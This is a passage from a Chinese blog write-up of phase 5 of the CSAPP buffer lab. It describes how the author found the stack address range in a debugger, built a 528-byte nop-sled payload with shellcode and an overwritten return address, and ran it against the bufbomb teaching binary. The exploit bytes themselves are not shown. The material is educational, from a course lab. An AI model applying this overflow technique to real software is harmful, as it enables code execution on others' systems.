+<p> 运行起该程序，由于testn函数体会运行5遍，所以每一遍就都断在0x8049215处，查看完 ebp-0x208的地址后，就输入c 继续，然后随便输入（不输入也行，直接回车），回车，然后就会断在下一遍的0x8049215处了。</p>
+<blockquote>
+<p>p ($ebp-0x208)</p>
+</blockquote>
+<p>我自己调试得到的起始地址范围：</p>
+<pre><code class="c">0x55683c38
+
+0x55683c48
+
+0x55683ca8 //该地址最大
+
+0x55683bd8
+
+0x55683bd8 //最后两次重复了可还行？</code></pre>
+<p>接下来就要确定返回地址填的该是什么地址了。</p>
+<p>因为buf的初始地址不确定，所以在payload中填充的跳转地址只能根据它的大致范围确定。</p>
+<p>我们选取可能的buf起始地址范围中的<code>最大地址值</code>：0x55683ca8。</p>
+<p>因为栈是从地址高处下降的，而代码是按正常的地址顺序执行的，所以使程序返回到最大的地址就可以使程序在运行攻击代码之前不遇到nop以外的指令。不过我还是听得一愣一愣的。不过后来我自己慢慢理解，终于有点领悟了。越靠后（地址越大）的栈起始地址就越有可能完全包含我们构造的所有栈数据（即使未完全包含也没事，最起码包含到nop就没事，然后就会一步步滑下去，直到执行我们的shellcode），避免遇到nop之前的其他指令。</p>
+<p>这样当buf移动的时候，由于 <code>nop sled</code> ，该地址将可以命中。</p>
+<p>所以最后构造payload：总共528个字节，其中末尾4字节是最大的栈起始地址0x55683ca8，倒数第二个4字节是ebp的值，可以随便覆盖没事，因为我们后续根据esp和ebp的关系把ebp的值给恢复过来。再倒数15个字节那就是我们的shellcode部分了。 其余都用“\x90”（nop）填充。</p>
+<p>实验结果：</p>
+<pre><code class="c">highk@highk:~/csapp lab/buffer lab$ cat phase5.txt | ./hex2raw -n| ./bufbomb -n -u sixpar
+Userid: sixpar
+Cookie: 0x171ae53c
+Type string:KABOOM!: getbufn returned 0x171ae53c
+Keep going
+Type string:KABOOM!: getbufn returned 0x171ae53c
+Keep going
+Type string:KABOOM!: getbufn returned 0x171ae53c
+Keep going
+Type string:KABOOM!: getbufn returned 0x171ae53c
+Keep going
+Type string:KABOOM!: getbufn returned 0x171ae53c
+VALID
+NICE JOB!</code></pre>
+<p>闲话：（一开始我忘了把前面500多字节的数据改为\x90了，害我迷惑了一会，呃呃呃，全都还是\x00，怪不得实验不成功呢。）</p>
+<p>注意本题的指令要加 -n：</p>
+<blockquote>
+<p>cat phase5.txt | ./hex2raw -n| ./bufbomb -n -u sixpar</p>
+</blockquote>
+<p>这里由于需要加-n来应对5次输入，所以我不得以要利用hex2raw来把十六进制数据变为字符串。根据提示，把phase5.txt文件里的十六进制数据用空格隔开即可。</p>
+<h3 id="关于buffer-lab的总结："><a href="#关于buffer-lab的总结：" class="headerlink" title="关于buffer lab的总结："></a>关于buffer lab的总结：</h3><p>今天花时间做完这个lab，回顾一下发现难度还是可以接受的，也学到了很多。接下来几个lab可能没那么好做了。</p>
+<p>做完这个lab，放张纪念照：</p>
+<p><img src="https://i.loli.net/2020/07/28/pI9Xw6K2t58VAqB.jpg" alt=""></p>
+<p>早睡早起身体好。</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论嗷。 </span>
